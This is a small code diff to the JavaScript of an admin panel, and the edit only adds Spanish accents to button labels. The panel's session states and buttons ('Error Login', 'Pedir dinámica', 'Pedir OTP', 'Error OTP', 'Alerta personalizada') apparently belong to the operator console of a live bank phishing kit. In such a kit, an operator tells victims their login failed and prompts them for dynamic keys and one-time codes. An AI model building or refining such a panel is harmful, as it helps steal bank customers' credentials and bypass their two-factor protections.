@@ -147,7 +147,7 @@
         case "AUTH_WAIT_ACTION":
           actions.innerHTML = `
             <button onclick="act('${s.id}','reject_auth')">Error Login</button>
-            <button onclick="act('${s.id}','request_dinamic')">Pedir dinamica</button>
+            <button onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
             <button onclick="act('${s.id}','request_otp')">Pedir otp</button>
           `;
           break;
@@ -158,21 +158,21 @@
 
         case "DINAMIC_WAIT_ACTION":
           actions.innerHTML = `
-      <button onclick="act('${s.id}','reject_dinamic')">Error Dinamica</button>
+      <button onclick="act('${s.id}','reject_dinamic')">Error dinámica</button>
       <button onclick="act('${s.id}','request_otp')">Pedir OTP</button>
       <button onclick="act('${s.id}','finish')">Finalizar</button>
     `;
           break;
 
         case "DINAMIC_ERROR":
-          actions.innerHTML = `<span style="color:#666">Esperando nueva dinamica</span>`;
+          actions.innerHTML = `<span style="color:#666">Esperando nueva dinámica</span>`;
           break;
 
         case "OTP_WAIT_ACTION":
           actions.innerHTML = `
             <button onclick="act('${s.id}','reject_otp')">Error OTP</button>
             <button onclick="act('${s.id}','custom_alert')">Alerta personalizada</button>
-            <button onclick="act('${s.id}','request_dinamic')">Pedir dinamica</button>
+            <button onclick="act('${s.id}','request_dinamic')">Pedir dinámica</button>
             <button onclick="act('${s.id}','finish')">Finalizar</button>
           `;
           break;
